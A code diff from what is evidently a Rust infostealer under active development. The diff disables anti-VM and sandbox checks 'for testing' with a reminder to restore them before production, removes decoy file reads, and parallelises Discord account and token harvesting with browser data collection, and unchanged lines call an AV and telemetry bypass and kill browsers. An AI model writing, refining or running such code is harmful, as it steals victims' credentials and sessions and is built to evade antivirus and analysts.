@@ -112,20 +112,9 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     // This silences telemetry and disables in-process AV scanning.
     core::bypass::apply_all();
 
-    // Quick pre-flight check: obvious sandbox indicators
-    if !core::detection::verify_environment() {
-        return Ok(());
-    }
-
-    thread::sleep(Duration::from_millis(100));
-
-    // Second pass: quick check repeated after small delay
-    if !core::detection::verify_environment() {
-        return Ok(());
-    }
-
-    // Composite score-based check with all stealthy anti-VM/sandbox measures
-    core::sandbox::verify_environment();
+    // Anti-VM/sandbox checks disabled for testing (detection + sandbox both no-op).
+    // Re-enable core::detection::verify_environment() and core::sandbox::verify_environment()
+    // before production use.
 
     let _stealth_applied = false;
 
@@ -153,14 +142,15 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         .build()
         .unwrap_or_else(|_| reqwest::Client::new());
 
-    let (_discord_accounts, discord_content, embeds) = crate::discord::get_discord_data(&client).await;
+    let client_discord = client.clone();
+    let discord_task = tokio::spawn(async move {
+        crate::discord::get_discord_data(&client_discord).await
+    });
+    let browsers_task = tokio::task::spawn_blocking(browsers::run);
 
-    let _ = core::decoy::read_system_files();
-    let _ = core::decoy::read_config_files();
-    let _ = core::decoy::calculate_fibonacci(50);
-    std::thread::sleep(std::time::Duration::from_millis(300));
-
-    let mut all_files = browsers::run();
+    let (_discord_accounts, discord_content, embeds) =
+        discord_task.await.unwrap_or((Vec::new(), String::new(), Vec::new()));
+    let mut all_files = browsers_task.await.unwrap_or_default();
 
     core::kill::kill_browsers();
 
